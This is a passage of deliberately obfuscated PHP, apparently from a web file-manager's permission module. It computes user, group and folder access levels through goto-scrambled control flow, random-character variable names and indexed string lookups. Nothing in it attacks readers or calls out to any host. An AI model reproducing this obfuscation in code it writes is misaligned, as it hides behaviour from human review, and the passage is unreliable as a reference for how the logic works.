dæšĞæöÊº: if (!$dâ¶ÜÔÜ‰) { return !1; } $B©˜¤îÕË = $dâ¶ÜÔÜ‰ ? $dâ¶ÜÔÜ‰[0] : $aä¡ëáŠ˜È; return array($E­âÔ„˜¦™[405] => -1, $E­âÔ„˜¦™[444] => array($E­âÔ„˜¦™[410] => $E­âÔ„˜¦™[1084], $E­âÔ„˜¦™[1696] => $E­âÔ„˜¦™[495], $E­âÔ„˜¦™[411] => LNG($E­âÔ„˜¦™[1871]), $E­âÔ„˜¦™[1711] => $E­âÔ„˜¦™[1872]), $E­âÔ„˜¦™[1873] => LNG($E­âÔ„˜¦™[1874]), $E­âÔ„˜¦™[1875] => $this->sourceAuthInfo($B©˜¤îÕË)); goto b¦­À„Ë™³; b¦­À„Ë™³: } protected function makeAuthDeep($F¯Ò†‰¯Ğƒ = false) { goto e°™±†ÄÅ; f„Ëæ¬ˆˆ: $cç‰Ş§Ââ” = $F¨ø¥í•ùâ; foreach ($cç‰Ş§Ââ” as $bòğ–¢¢Û) { $d’Ï„ËÕˆÂ = $Cæ°Î®¡ĞŞ->getInfo($bòğ–¢¢Û); $aâ„›ò°áİ = $E â¼Ü¡->parentLevelArray($d’Ï„ËÕˆÂ[$fõÇ¡¿“¸[485]]); $F¨ø¥í•ùâ = array_merge($F¨ø¥í•ùâ, $aâ„›ò°áİ); } $F¨ø¥í•ùâ = array_values(array_unique($F¨ø¥í•ùâ)); goto d¬°‹Úù˜; d©èæµ–“Ñ: $DíİÕˆåŸä = array(); if ($Fñ±™†‡´è) { $BÏ…æ²º¶¿ = $E â¼Ü¡->where(array($fõÇ¡¿“¸[394] => array($fõÇ¡¿“¸[409], $Fñ±™†‡´è)))->select(); foreach ($BÏ…æ²º¶¿ as $F‚È‚øëé) { $aâ„›ò°áİ = $E â¼Ü¡->parentLevelArray($F‚È‚øëé[$fõÇ¡¿“¸[485]]); $C‡åòäå¯£ = array_merge($C‡åòäå¯£, $aâ„›ò°áİ); $F¨ø¥í•ùâ[] = $F‚È‚øëé[$fõÇ¡¿“¸[482]]; $aæ‘½öÙ·[$F‚È‚øëé[$fõÇ¡¿“¸[394]]] = $aâ„›ò°áİ; $b…øŒ‰ÇÓÉ[$F‚È‚øëé[$fõÇ¡¿“¸[394]]] = $F‚È‚øëé[$fõÇ¡¿“¸[482]]; } } $F¨ø¥í•ùâ = array_values(array_unique($F¨ø¥í•ùâ)); goto f„Ëæ¬ˆˆ; dÁ£«°ÌÜ»: if ($a×Æ‚“ƒÌ¤) { $Eºó³˜¬å = array(array($fõÇ¡¿“¸[402] => SourceModel::TYPE_USER, $fõÇ¡¿“¸[482] => $F¯Ò†‰¯Ğƒ), array($fõÇ¡¿“¸[402] => SourceModel::TYPE_GROUP, $fõÇ¡¿“¸[482] => array($fõÇ¡¿“¸[409], $a×Æ‚“ƒÌ¤)), $fõÇ¡¿“¸[956] => $fõÇ¡¿“¸[1777]); } $e‹‡áŠ•®» = $this->field($fõÇ¡¿“¸[1877])->where($Eºó³˜¬å)->select(); $Fñ±™†‡´è = array(); goto cÛëÒ•¦„ã; fÄôÚ˜©‘: $aæ‘½öÙ· = array(); $b…øŒ‰ÇÓÉ = array(); $C„¶É¿ª÷‹ = array(); goto d©èæµ–“Ñ; B÷²„Óò‹Ø: $dÅÁ•ÊÑø  = array($fõÇ¡¿“¸[1869] => $C‡åòäå¯£, $fõÇ¡¿“¸[1870] => $aæ‘½öÙ·); $D‹÷Ãñë‡»[$F¯Ò†‰¯Ğƒ] = $dÅÁ•ÊÑø ; return $dÅÁ•ÊÑø ; goto EŒ¾³°µíø; F×êÎ„ƒÉè: $F¨ø¥í•ùâ = $a×Æ‚“ƒÌ¤; $E â¼Ü¡ = Model($fõÇ¡¿“¸[1204]); $Cæ°Î®¡ĞŞ = Model($fõÇ¡¿“¸[484]); goto fÄôÚ˜©‘; e°™±†ÄÅ: $fõÇ¡¿“¸ =& $_SERVER[¬ı§†‰ú˜¼]; static $D‹÷Ãñë‡» = array(); $F¯Ò†‰¯Ğƒ = $F¯Ò†‰¯Ğƒ ? $F¯Ò†‰¯Ğƒ : USER_ID; goto Bğ­ä‘¤Í; d¬°‹Úù˜: foreach ($F¨ø¥í•ùâ as $bòğ–¢¢Û) { $d’Ï„ËÕˆÂ = $Cæ°Î®¡ĞŞ->getInfo($bòğ–¢¢Û); $C‡åòäå¯£[] = $d’Ï„ËÕˆÂ[$fõÇ¡¿“¸[85]][$fõÇ¡¿“¸[394]]; $C„¶É¿ª÷‹[$bòğ–¢¢Û] = $d’Ï„ËÕˆÂ[$fõÇ¡¿“¸[85]][$fõÇ¡¿“¸[394]]; $DíİÕˆåŸä[$bòğ–¢¢Û] = $E â¼Ü¡->parentLevelArray($d’Ï„ËÕˆÂ[$fõÇ¡¿“¸[485]]); } foreach ($aæ‘½öÙ· as $dà±ˆÃÇßÂ => $FÁ±…¯ìÓ) { $AƒŒ£Ğ†Ï• = $b…øŒ‰ÇÓÉ[$dà±ˆÃÇßÂ]; if (!$AƒŒ£Ğ†Ï• || !$C„¶É¿ª÷‹[$AƒŒ£Ğ†Ï•]) { continue; } $D¨ä¦í«‰Ì = array(); foreach ($DíİÕˆåŸä[$AƒŒ£Ğ†Ï•] as $bòğ–¢¢Û) { $D¨ä¦í«‰Ì[] = $C„¶É¿ª÷‹[$bòğ–¢¢Û]; } $aæ‘½öÙ·[$dà±ˆÃÇßÂ] = array_merge($D¨ä¦í«‰Ì, $FÁ±…¯ìÓ); } $C‡åòäå¯£ = array_values(array_unique($C‡åòäå¯£)); goto B÷²„Óò‹Ø; c‚»ƒó”½: foreach ($Bİ®Ù‡£Êô as $fë¥¬¼…½³) { if ($fë¥¬¼…½³[$fõÇ¡¿“¸[404]] == 0 && $fë¥¬¼…½³[$fõÇ¡¿“¸[1712]] == $fõÇ¡¿“¸[87]) { $cĞçÁÒä[] = $fë¥¬¼…½³[$fõÇ¡¿“¸[392]]; } } $a×Æ‚“ƒÌ¤ = $this->userGroupParents($F¯Ò†‰¯Ğƒ); $Eºó³˜¬å = array($fõÇ¡¿“¸[402] => SourceModel::TYPE_USER, $fõÇ¡¿“¸[482] => $F¯Ò†‰¯Ğƒ); goto dÁ£«°ÌÜ»; cÛëÒ•¦„ã: $aˆ„¡«‘ß‘ = array_to_keyvalue_group($e‹‡áŠ•®», $fõÇ¡¿“¸[394]); foreach ($aˆ„¡«‘ß‘ as $DÎ¯ˆÀØä => $a’“Ô¥Å’) { $F«Œø²’¸‰ = $this->authArrayCheck($a’“Ô¥Å’, $F¯Ò†‰¯Ğƒ); if ($F«Œø²’¸‰[$fõÇ¡¿“¸[405]] > 0) { $Fñ±™†‡´è[] = $DÎ¯ˆÀØä . $fõÇ¡¿“¸[33]; } } $C‡åòäå¯£ = array(); goto F×êÎ„ƒÉè; Bğ­ä‘¤Í: if (isset($D‹÷Ãñë‡»[$F¯Ò†‰¯Ğƒ])) { return $D‹÷Ãñë‡»[$F¯Ò†‰¯Ğƒ]; } $Bİ®Ù‡£Êô = Model($fõÇ¡¿“¸[1876])->listData(); $cĞçÁÒä = array(); goto c‚»ƒó”½; EŒ¾³°µíø: } private function makeSourceAuth($BéñØµæâ, $BÒî¨à”å, $fÚÌ¢ø‡î¶ = false) { goto f¡¼õôÓÀ³; fè”÷…ã—Ğ: $fœÍãÈ¡ÍÅ = Model($C´¼¿ˆÙƒ¹[1204])->parentLevelArray($BéñØµæâ[$C´¼¿ˆÙƒ¹[485]]); $fœÍãÈ¡ÍÅ = array_merge(array($BéñØµæâ[$C´¼¿ˆÙƒ¹[394]]), array_reverse($fœÍãÈ¡ÍÅ)); $AÜòè¦êÅ = !1; goto EŞŸ§Êœµ¯; DË ëÌ¸ÏÜ: $Cˆæí´°Å = $BéñØµæâ[$C´¼¿ˆÙƒ¹[402]] == SourceModel::TYPE_GROUP; $B ˆˆöÆ…Ğ = $Cˆæí´°Å ? $this->groupRootAuth($eˆ„¸›Ğ›¤, $fÚÌ¢ø‡î¶) : !1; if ($B ˆˆöÆ…Ğ && Model($C´¼¿ˆÙƒ¹[1857])->authCheckAction($B ˆˆöÆ…Ğ[$C´¼¿ˆÙƒ¹[404]], $C´¼¿ˆÙƒ¹[1710])) { return $this->groupAuthInfo($B ˆˆöÆ…Ğ, $eˆ„¸›Ğ›¤); } goto fè”÷…ã—Ğ; f¡¼õôÓÀ³: $C´¼¿ˆÙƒ¹ =& $_SERVER[¬ı§†‰ú˜¼]; $fĞğœìİ¥ = $C´¼¿ˆÙƒ¹[87]; $eˆ„¸›Ğ›¤ = $BéñØµæâ[$C´¼¿ˆÙƒ¹[482]]; goto DË ëÌ¸ÏÜ; fÉ—–Ô§ˆÁ: if (!$AÜòè¦êÅ) { $b¤äğÙÓÊ˜ = Model($C´¼¿ˆÙƒ¹[484])->getInfo($eˆ„¸›Ğ›¤); $B²´ÑÅ¥î = explode($C´¼¿ˆÙƒ¹[47], trim($b¤äğÙÓÊ˜[$C´¼¿ˆÙƒ¹[485]], $C´¼¿ˆÙƒ¹[47])); $B²´ÑÅ¥î = array_reverse($B²´ÑÅ¥î); foreach ($B²´ÑÅ¥î as $BÑ›¼Éò¦Ø) { if ($BÑ›¼Éò¦Ø == $C´¼¿ˆÙƒ¹[495] || $BÑ›¼Éò¦Ø == $fĞğœìİ¥) { continue; } $A¬âƒİšö = $this->groupRootAuth($BÑ›¼Éò¦Ø, $fÚÌ¢ø‡î¶); if (!$A¬âƒİšö) { continue; } $AÜòè¦êÅ = $this->groupAuthInfo($A¬âƒİšö, $BÑ›¼Éò¦Ø); break; } } if (!$AÜòè¦êÅ || $AÜòè¦êÅ[$C´¼¿ˆÙƒ¹[405]] <= 0) { $c¬”š¢¯ß = $this->authDeepCheck($BéñØµæâ[$C´¼¿ˆÙƒ¹[394]], $fÚÌ¢ø‡î¶); if ($c¬”š¢¯ß) { $AÜòè¦êÅ = $c¬”š¢¯ß; } } return $AÜòè¦êÅ; goto d˜°˜ÍÀ; EŞŸ§Êœµ¯: foreach ($fœÍãÈ¡ÍÅ as $CºùÁˆ¨µï) { if (!isset($BÒî¨à”å[$CºùÁˆ¨µï])) { continue; } $c÷ÜĞİñÈ = $this->authMake($BÒî¨à”å[$CºùÁˆ¨µï], $fÚÌ¢ø‡î¶); if ($c÷ÜĞİñÈ[$C´¼¿ˆÙƒ¹[444]]) { $AÜòè¦êÅ = $c÷ÜĞİñÈ; break; } } if (!$Cˆæí´°Å) { return $AÜòè¦êÅ; } if (!$AÜòè¦êÅ && $B ˆˆöÆ…Ğ) { $AÜòè¦êÅ = $this->groupAuthInfo($B ˆˆöÆ…Ğ, $eˆ„¸›Ğ›¤); } goto fÉ—–Ô§ˆÁ; d˜°˜ÍÀ: } private function userIsRoot($bğëÉ„¬¨ = false) { $DÅİø‹Ÿ =& $_SERVER[¬ı§†‰ú˜¼]; if (!$bğëÉ„¬¨ && _get($GLOBALS, $DÅİø‹Ÿ[483])) { return !0; } $AÇÇå«Œí = Model($DÅİø‹Ÿ[505])->getInfo($bğëÉ„¬¨); $CÅÃ–Š±Û = Model($DÅİø‹Ÿ[1878])->listData($AÇÇå«Œí[$DÅİø‹Ÿ[1411]]); if ($CÅÃ–Š±Û && $CÅÃ–Š±Û[$DÅİø‹Ÿ[1281]][$DÅİø‹Ÿ[1879]] == 1) { return !0; } return !1; } private function sourceAuthInfo($dàÕ’å‹ÄŸ) { goto bŞÉøÎĞÀ…; D¾‹«¯¾íâ: if (isset($fÛ‘®³Ò‘ [$C°ğÖßëâ[490]])) { $D¯ò²›çÇÒ = explode($C°ğÖßëâ[8], trim($fÛ‘®³Ò‘ [$C°ğÖßëâ[493]], $C°ğÖßëâ[8])); array_shift($D¯ò²›çÇÒ); $AªóÂĞ£ğˆ = $fÛ‘®³Ò‘ [$C°ğÖßëâ[488]] . $C°ğÖßëâ[1880] . implode($C°ğÖßëâ[8], $D¯ò²›çÇÒ); } return array($C°ğÖßëâ[411] => $fÛ‘®³Ò‘ [$C°ğÖßëâ[28]], $C°ğÖßëâ[76] => KodIO::make($fÛ‘®³Ò‘ [$C°ğÖßëâ[394]]), $C°ğÖßëâ[1881] => $AªóÂĞ£ğˆ); goto d –†ƒ”È£; bŞÉøÎĞÀ…: $C°ğÖßëâ =& $_SERVER[¬ı§†‰ú˜¼]; $Dòè’µ¾¼Ó = Model($C°ğÖßëâ[1204]); $fÛ‘®³Ò‘  = $Dòè’µ¾¼Ó->sourceInfo($dàÕ’å‹ÄŸ); goto dÎã ›Ô×ò; ağ†¤ó½÷¨: $DÂğª·É¬ = $Dòè’µ¾¼Ó->_listAppendPath($DÂğª·É¬); $fÛ‘®³Ò‘  = $DÂğª·É¬[0]; $AªóÂĞ£ğˆ = $fÛ‘®³Ò‘ [$C°ğÖßëâ[493]]; goto D¾‹«¯¾íâ; dÎã ›Ô×ò: if (!$fÛ‘®³Ò‘ ) { return !1; } $Dòè’µ¾¼Ó->groupPathDisplay($fÛ‘®³Ò‘ ); $DÂğª·É¬ = array($fÛ‘®³Ò‘ ); goto ağ†¤ó½÷¨; d –†ƒ”È£: } private function groupAuthInfo($bæÏ°ğõğ”, $B©Û°Ê®£ñ) { $BÄˆÒŠÊ =& $_SERVER[¬ı§†‰ú˜¼]; $e¶ªõàğôÍ = Model($BÄˆÒŠÊ[484])->getInfo($B©Û°Ê®£ñ); return array($BÄˆÒŠÊ[1882] => intval($bæÏ°ğõğ”[$BÄˆÒŠÊ[404]]), $BÄˆÒŠÊ[1866] => $bæÏ°ğõğ”, $BÄˆÒŠÊ[1883] => LNG($BÄˆÒŠÊ[1884]), $BÄˆÒŠÊ[1875] => array($BÄˆÒŠÊ[411] => $e¶ªõàğôÍ[$BÄˆÒŠÊ[28]], $BÄˆÒŠÊ[76] => KodIO::make($e¶ªõàğôÍ[$BÄˆÒŠÊ[85]][$BÄˆÒŠÊ[394]]), $BÄˆÒŠÊ[1881] => $e¶ªõàğôÍ[$BÄˆÒŠÊ[489]])); } protected function groupRootAuth($B”¯†‚“—, $eºÛÀ‹ùè = false) { goto Cãæ…ÜÖĞŸ; Cãæ…ÜÖĞŸ: $AÈ‚ñÏ‰É™ =& $_SERVER[¬ı§†‰ú˜¼]; $eºÛÀ‹ùè = $eºÛÀ‹ùè ? $eºÛÀ‹ùè : USER_ID; $CŠÃ¥ƒƒá… = $eºÛÀ‹ùè . $AÈ‚ñÏ‰É™[1885] . $B”¯†‚“—; goto a¿’½Ã÷¯¡; dÍŞğø³¢: $aÓøŸ„ ÚÆ[$CŠÃ¥ƒƒá…] = $A»ÍË—† ? $A»ÍË—† : $f‡œ¶¾æğ; return $aÓøŸ„ ÚÆ[$CŠÃ¥ƒƒá…]; goto eøÃ’ó; a¿’½Ã÷¯¡: static $aÓøŸ„ ÚÆ = array(); if (isset($aÓøŸ„ ÚÆ[$CŠÃ¥ƒƒá…])) { return $aÓøŸ„ ÚÆ[$CŠÃ¥ƒƒá…]; } $BÎÌ¿…«¢Ô = Model($AÈ‚ñÏ‰É™[484])->getInfo($B”¯†‚“—); goto a‘ö„•Å¹™; a‘ö„•Å¹™: $CŒˆ¿Ïöƒƒ = $this->userGroupList($eºÛÀ‹ùè); $f‡œ¶¾æğ = isset($CŒˆ¿Ïöƒƒ[$B”¯†‚“—]) ? $CŒˆ¿Ïöƒƒ[$B”¯†‚“—][$AÈ‚ñÏ‰É™[404]] : !1; if ($f‡œ¶¾æğ && Model($AÈ‚ñÏ‰É™[1857])->authCheckAction($f‡œ¶¾æğ[$AÈ‚ñÏ‰É™[404]], $AÈ‚ñÏ‰É™[1710])) { $aÓøŸ„ ÚÆ[$CŠÃ¥ƒƒá…] = $f‡œ¶¾æğ; return $f‡œ¶¾æğ; } goto FÀƒ—îáø; FÀƒ—îáø: $dÉ¾ñŒ¹å = $this->sourceAuthSelect($BÎÌ¿…«¢Ô[$AÈ‚ñÏ‰É™[85]][$AÈ‚ñÏ‰É™[394]]); $bà­…ñÄÓŸ = $dÉ¾ñŒ¹å ? $this->authMake($dÉ¾ñŒ¹å, $eºÛÀ‹ùè) : !1; $A»ÍË—† = $bà­…ñÄÓŸ ? $bà­…ñÄÓŸ[$AÈ‚ñÏ‰É™[444]] : !1; goto dÍŞğø³¢; eøÃ’ó: } public function authOwnerApply($A¯©íŠ×Üô) { goto AÏ±¦‚‰Ï; DíÊËÕáß»: $A¯©íŠ×Üô[$AŠ·Ÿ‘Í¼¼[404]][$AŠ·Ÿ‘Í¼¼[1888]] = Model($AŠ·Ÿ‘Í¼¼[501])->userListInfo($D…š¨ŸÅøñ); return $A¯©íŠ×Üô; goto B¦¶”¾©¤; AæÈÌªáˆø: if (count($D…š¨ŸÅøñ) == 0) { $D…š¨ŸÅøñ = $this->authFolderOwnerGroup($A¯©íŠ×Üô[$AŠ·Ÿ‘Í¼¼[482]]); } $D…š¨ŸÅøñ = array_unique($D…š¨ŸÅøñ); if (AuthModel::authCheckRoot($A¯©íŠ×Üô[$AŠ·Ÿ‘Í¼¼[404]][$AŠ·Ÿ‘Í¼¼[405]])) { $D…š¨ŸÅøñ[] = USER_ID; } goto DíÊËÕáß»; f£ùòˆ—Õ‰: $Eğ´É†²ë¼ = array(); $D…š¨ŸÅøñ = array(); foreach ($f‡öå¹‰Ç as $aĞÌæ„Û³ => $C®¯ñå) { $eµ‚ÈŒ™Ñ¬ = $this->authFolderOwnerUser($C®¯ñå); $Eğ´É†²ë¼[$aĞÌæ„Û³] = $eµ‚ÈŒ™Ñ¬; $D…š¨ŸÅøñ = array_merge($D…š¨ŸÅøñ, $eµ‚ÈŒ™Ñ¬[$AŠ·Ÿ‘Í¼¼[561]]); if ($eµ‚ÈŒ™Ñ¬[$AŠ·Ÿ‘Í¼¼[1887]]) { break; } } goto AæÈÌªáˆø; b„è½¡”: $cëó†–±—¶ = Model($AŠ·Ÿ‘Í¼¼[1204])->parentLevelArray($A¯©íŠ×Üô[$AŠ·Ÿ‘Í¼¼[485]]); $cëó†–±—¶ = array_merge(array($A¯©íŠ×Üô[$AŠ·Ÿ‘Í¼¼[394]]), array_reverse($cëó†–±—¶)); $f‡öå¹‰Ç = $this->sourceAuthSelect($cëó†–±—¶); goto f£ùòˆ—Õ‰; AÏ±¦‚‰Ï: $AŠ·Ÿ‘Í¼¼ =& $_SERVER[¬ı§†‰ú˜¼]; if (empty($A¯©íŠ×Üô[$AŠ·Ÿ‘Í¼¼[404]]) || isset($A¯©íŠ×Üô[$AŠ·Ÿ‘Í¼¼[1886]]) && $A¯©íŠ×Üô[$AŠ·Ÿ‘Í¼¼[1886]]) { return $A¯©íŠ×Üô; } if (AuthModel::authCheckRoot($A¯©íŠ×Üô[$AŠ·Ÿ‘Í¼¼[404]][$AŠ·Ÿ‘Í¼¼[405]])) { return $A¯©íŠ×Üô; } goto b„è½¡”; B¦¶”¾©¤: } private function authFolderOwnerGroup($eÎŠİóÚ®„) { $bôøÛ‰ËÎí =& $_SERVER[¬ı§†‰ú˜¼]; $f±“¦·Ä®ƒ = Model($bôøÛ‰ËÎí[1771])->where(array($bôøÛ‰ËÎí[1690] => $eÎŠİóÚ®„))->select(); $A¼¦±š—™‘ = array(); if (!$f±“¦·Ä®ƒ) { return $A¼¦±š—™‘; } foreach ($f±“¦·Ä®ƒ as $D˜ò‘»ºğõ) { $dªÛïì£Š‚ = $this->authInfo($D˜ò‘»ºğõ); if (AuthModel::authCheckRoot($dªÛïì£Š‚[$bôøÛ‰ËÎí[404]])) { $A¼¦±š—™‘[] = $D˜ò‘»ºğõ[$bôøÛ‰ËÎí[1527]]; } } return $A¼¦±š—™‘; } private function authFolderOwnerUser($DğêÍµ©çê) { $fµÖ‘ğª‹Ø =& $_SERVER[¬ı§†‰ú˜¼]; $b®É½Ğ¥ƒ = array(); $AË½»¨½ñ­ = !1; foreach ($DğêÍµ©çê as $C÷™ŠÉŒÈµ) { $Fáëóİ‚§‰ = $this->authInfo($C÷™ŠÉŒÈµ); if ($C÷™ŠÉŒÈµ[$fµÖ‘ğª‹Ø[482]] == $fµÖ‘ğª‹Ø[495]) { $AË½»¨½ñ­ = !0; } if ($C÷™ŠÉŒÈµ[$fµÖ‘ğª‹Ø[402]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($Fáëóİ‚§‰[$fµÖ‘ğª‹Ø[404]])) { $b®É½Ğ¥ƒ[] = $C÷™ŠÉŒÈµ[$fµÖ‘ğª‹Ø[482]]; } } } return array($fµÖ‘ğª‹Ø[561] => $b®É½Ğ¥ƒ, $fµÖ‘ğª‹Ø[1887] => $AË½»¨½ñ­); } public function authMake($aîÛäÚ¿Ûö, $cÛ’ğî¹¿ò = false) { $c²½á£³ß… =& $_SERVER[¬ı§†‰ú˜¼]; $d‡Ô³„… = $this->authArrayCheck($aîÛäÚ¿Ûö, $cÛ’ğî¹¿ò); if ($d‡Ô³„…[$c²½á£³ß…[1889]]) { $d‡Ô³„…[$c²½á£³ß…[1889]] = $this->sourceAuthInfo($d‡Ô³„…[$c²½á£³ß…[1889]]); } return $d‡Ô³„…; } public function authArrayCheck($B©Ã¡‚ç¾Ş, $B›òë¸Úìµ = false) { goto d™å²ïÃŠ; d™å²ïÃŠ: $Cò´á°ğ =& $_SERVER[¬ı§†‰ú˜¼]; if (!$B©Ã¡‚ç¾Ş) { return array($Cò´á°ğ[405] => 0, $Cò´á°ğ[444] => !1); } $B›òë¸Úìµ = $B›òë¸Úìµ ? $B›òë¸Úìµ : USER_ID; goto c»ºÒåö¤; fäëÁªÀËÕ: return $CÊ÷êñä²Â; goto fö ñöØ; DğÕ–ƒ…øö: $B‚­øİÈÊ = 1000; $e·¦Âƒ«éá = 0; $d‹«ÙÈÏó˜ = 0; goto Dí‰ŸØ¹§; Dí‰ŸØ¹§: $d®â‰„•»× = 0; $f÷Ğ¿é¾£ = 0; $Aîñ£¯ÀÜ¤ = array($Cò´á°ğ[394] => 0); goto B«›ºµ³ŞÛ; B«›ºµ³ŞÛ: foreach ($B©Ã¡‚ç¾Ş as $Aîñ£¯ÀÜ¤) { $E¶§Œ°ãî¸ = $this->authInfo($Aîñ£¯ÀÜ¤); if (!$E¶§Œ°ãî¸) { continue; } $Aá¬Íğò©– = $Aîñ£¯ÀÜ¤[$Cò´á°ğ[482]]; $FÄ‹í÷´£Ğ = intval($E¶§Œ°ãî¸[$Cò´á°ğ[404]]); if ($Aîñ£¯ÀÜ¤[$Cò´á°ğ[402]] == SourceModel::TYPE_USER && $Aá¬Íğò©– == $B›òë¸Úìµ) { $b®‹–ÄËÉÈ = !0; $EÇöÈ‚´ß¼ = $E¶§Œ°ãî¸; $dÏš‹‚¿çÛ = $FÄ‹í÷´£Ğ; } else { if ($Aîñ£¯ÀÜ¤[$Cò´á°ğ[402]] == SourceModel::TYPE_GROUP && $this->groupContainUser($Aá¬Íğò©–, $B›òë¸Úìµ)) { $a¡¹áˆ«íÊ = !0; $FÛì…ÚñİĞ = $this->groupStepToUserGroup($Aá¬Íğò©–, $B›òë¸Úìµ); if ($FÛì…ÚñİĞ < $B‚­øİÈÊ) { $B‚­øİÈÊ = $FÛì…ÚñİĞ; $bšŒŠÈ‰–« = $FÄ‹í÷´£Ğ; $dœ½Çµç£¦ = $E¶§Œ°ãî¸; $e·¦Âƒ«éá = $Aá¬Íğò©–; } if ($FÛì…ÚñİĞ == $B‚­øİÈÊ && $FÄ‹í÷´£Ğ >= $bšŒŠÈ‰–«) { $bšŒŠÈ‰–« = $FÄ‹í÷´£Ğ; $dœ½Çµç£¦ = $E¶§Œ°ãî¸; $e·¦Âƒ«éá = $Aá¬Íğò©–; } } else { if ($Aá¬Íğò©– == $Cò´á°ğ[495]) { $d‹«ÙÈÏó˜ = !0; $f÷Ğ¿é¾£ = $E¶§Œ°ãî¸; $d®â‰„•»× = $FÄ‹í÷´£Ğ; } } } } if ($b®‹–ÄËÉÈ) { $Aºõ‚¡ Ê… = $dÏš‹‚¿çÛ; $E¶§Œ°ãî¸ = $EÇöÈ‚´ß¼; $c¿İ¼¬” = LNG($Cò´á°ğ[1890]); } else { if ($a¡¹áˆ«íÊ) { $Aºõ‚¡ Ê… = $bšŒŠÈ‰–«; $E¶§Œ°ãî¸ = $dœ½Çµç£¦; $d›õñ¾Ëº = Model($Cò´á°ğ[484])->getInfo($e·¦Âƒ«éá); $c¿İ¼¬” = $Cò´á°ğ[160] . $d›õñ¾Ëº[$Cò´á°ğ[489]] . $Cò´á°ğ[1891] . LNG($Cò´á°ğ[1892]); } else { if ($d‹«ÙÈÏó˜) { $Aºõ‚¡ Ê… = $d®â‰„•»×; $E¶§Œ°ãî¸ = $f÷Ğ¿é¾£; $c¿İ¼¬” = LNG($Cò´á°ğ[1863]); } else { $Aºõ‚¡ Ê… = 0; $E¶§Œ°ãî¸ = !1; $c¿İ¼¬” = $Cò´á°ğ[33]; } } } $CÊ÷êñä²Â = array($Cò´á°ğ[1882] => intval($Aºõ‚¡ Ê…), $Cò´á°ğ[1866] => $E¶§Œ°ãî¸, $Cò´á°ğ[1883] => $c¿İ¼¬”, $Cò´á°ğ[1875] => $Aîñ£¯ÀÜ¤[$Cò´á°ğ[394]]); goto fäëÁªÀËÕ; c»ºÒåö¤: $b®‹–ÄËÉÈ = 0; $dÏš‹‚¿çÛ = 0; $EÇöÈ‚´ß¼ = 0; goto f’¡Â³†Åš; f’¡Â³†Åš: $a¡¹áˆ«íÊ = 0; $bšŒŠÈ‰–« = 0; $dœ½Çµç£¦ = 0; goto DğÕ–ƒ…øö; fö ñöØ: } private function groupContainUser($fÖÛãÓÜ‡¯, $eÒèŒò·Ù = false) { return in_array($fÖÛãÓÜ‡¯, $this->userGroupParents($eÒèŒò·Ù)); } private function groupStepToUserGroup($CĞ…íñ‰İ, $AĞˆ–©¯£» = false) { goto FÄôØÆÎŒô; cÃ¬Ÿ•¾‰“: return $a¯±Š¡›ù©; goto FÏ¼ÂÃÓïİ; FÄôØÆÎŒô: $aº˜’±í¼‰ =& $_SERVER[¬ı§†‰ú˜¼]; $E¸ÔÄ¶óŒõ = $this->userGroupList($AĞˆ–©¯£»); $a¯±Š¡›ù© = 1000; goto a‡Â¦½šê­; a‡Â¦½šê­: $F½àÕ›ï¶Ä = $GLOBALS[$aº˜’±í¼‰[6]][$aº˜’±í¼‰[88]][$aº˜’±í¼‰[1782]] == 1; $CÏÑí¿â¾„ = $F½àÕ›ï¶Ä ? 3 : 2; foreach ($E¸ÔÄ¶óŒõ as $C‘ä…¥ïÅš) { if ($C‘ä…¥ïÅš[$aº˜’±í¼‰[1690]] == $CĞ…íñ‰İ) { return 0; } $BÙˆ¹³«¬ = explode($aº˜’±í¼‰[47], trim($C‘ä…¥ïÅš[$aº˜’±í¼‰[485]], $aº˜’±í¼‰[47])); if ($BÙˆ¹³«¬[0] == $aº˜’±í¼‰[495] && count($BÙˆ¹³«¬) > $CÏÑí¿â¾„) { $aïÃôÑä›± = array_reverse(array_slice($BÙˆ¹³«¬, $CÏÑí¿â¾„)); $dî Æó÷Å = array_search($CĞ…íñ‰İ, $aïÃôÑä›±); if ($dî Æó÷Å !== !1 && $dî Æó÷Å + 1 <= $a¯±Š¡›ù©) { $a¯±Š¡›ù© = $dî Æó÷Å + 1; } } } goto cÃ¬Ÿ•¾‰“; FÏ¼ÂÃÓïİ: } private function userGroupList($f‰¶Òù Æ = false) { $b¬áõ äË¤ =& $_SERVER[¬ı§†‰ú˜¼]; static $d¬ï­‹¨‹ = array(); if (isset($d¬ï­‹¨‹[$f‰¶Òù Æ])) { return $d¬ï­‹¨‹[$f‰¶Òù Æ]; } $aÈÉÆâ¨“ = Model($b¬áõ äË¤[505])->getInfo($f‰¶Òù Æ); $d¬ï­‹¨‹[$f‰¶Òù Æ] = array_to_keyvalue($aÈÉÆâ¨“[$b¬áõ äË¤[1864]], $b¬áõ äË¤[1690]); return $d¬ï­‹¨‹[$f‰¶Òù Æ]; } public function userGroupParents($C½Ü¯è¸Ùç) { goto eº¯ø¶†×; e•©¢Áİâ: $E¤•…åîô¶[$C½Ü¯è¸Ùç] = array_unique($fÁ—²ª¥¯); return $E¤•…åîô¶[$C½Ü¯è¸Ùç]; goto añÚ­ßç¶Á; D…—¶èƒï: if (isset($E¤•…åîô¶[$C½Ü¯è¸Ùç])) { return $E¤•…åîô¶[$C½Ü¯è¸Ùç]; } $D¤¼ˆ„Ç¦‚ = $this->userGroupList($C½Ü¯è¸Ùç); $fÁ—²ª¥¯ = array(); goto c»»Å¼ƒ‡; eº¯ø¶†×: $Fî½¿±ÍÙ =& $_SERVER[¬ı§†‰ú˜¼]; static $E¤•…åîô¶ = array(); $C½Ü¯è¸Ùç = $C½Ü¯è¸Ùç ? $C½Ü¯è¸Ùç : USER_ID; goto D…—¶èƒï; c»»Å¼ƒ‡: $a’ ¥¼¨Ö» = $GLOBALS[$Fî½¿±ÍÙ[6]][$Fî½¿±ÍÙ[88]][$Fî½¿±ÍÙ[1782]] == 1; $c§Ù›ŒçèŠ = $a’ ¥¼¨Ö» ? 3 : 2; foreach ($D¤¼ˆ„Ç¦‚ as $cº£èµ¯¨¹) { $cÍµ…µ‚± = array($cº£èµ¯¨¹[$Fî½¿±ÍÙ[1690]]); $fˆ¯¡ôï…Ö = explode($Fî½¿±ÍÙ[47], trim($cº£èµ¯¨¹[$Fî½¿±ÍÙ[485]], $Fî½¿±ÍÙ[47])); if ($fˆ¯¡ôï…Ö[0] == $Fî½¿±ÍÙ[495] && count($fˆ¯¡ôï…Ö) > $c§Ù›ŒçèŠ) { $b‰İ’œïè÷ = array_slice($fˆ¯¡ôï…Ö, $c§Ù›ŒçèŠ); $cÍµ…µ‚± = array_merge($cÍµ…µ‚±, array_reverse($b‰İ’œïè÷)); } 